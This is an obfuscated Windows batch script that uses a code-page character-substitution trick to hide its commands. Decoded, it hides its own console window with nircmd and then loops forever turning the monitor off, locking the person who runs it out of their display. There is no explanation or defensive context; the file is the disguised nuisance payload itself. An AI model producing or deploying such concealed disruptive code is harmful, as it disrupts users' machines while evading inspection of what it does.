@echo off&(if defined @lo@ goto ¡)&setlocal disableDelayedExpansion&for /f "delims=: tokens=2" %%A in ('chcp') do set "@chcp@=chcp %%A>nul"&chcp 708>nul&set ^"@args@=%*"
set "@lo@= !#$&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~""
set "@hi@=¡¢¤¥§¨©×«¬­®¯°±²³´µ¶·¸¹÷»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞ‗אבגדהוזחטיךכלםמןנסעףפץצקרשתûü‎‏ÿ£"
(setlocal enableDelayedExpansion&for /l %%N in (0 1 93) do set "!@hi@:~%%N,1!=!@lo@:~%%N,1!")&cmd /c ^""%~f0" !@args@!"
%@chcp@%&exit /b
:¡
%Á%%ז%%ה%%י%%נ%%¡%%נ%%ח%%ח%
%ן%%ך%%ף%%ה%%מ%%ו%%¯%%ז%%ש%%ז%%¡%%ר%%ך%%ן%%¡%%י%%ך%%ו%%ז%%¡%%ך%%ץ%%ך%%ץ%%ם%%ז%%¡%%£%%ה%%מ%%ו%%¯%%ז%%ש%%ז%%£%
:f9a
%¡%%ן%%ך%%ף%%ה%%מ%%ו%%¯%%ז%%ש%%ז%%¡%%מ%%נ%%ן%%ך%%ץ%%נ%%ף%%¡%%נ%%ח%%ח%%¡%
%ט%%נ%%ץ%%נ%%¡%%ח%%÷%%ג%
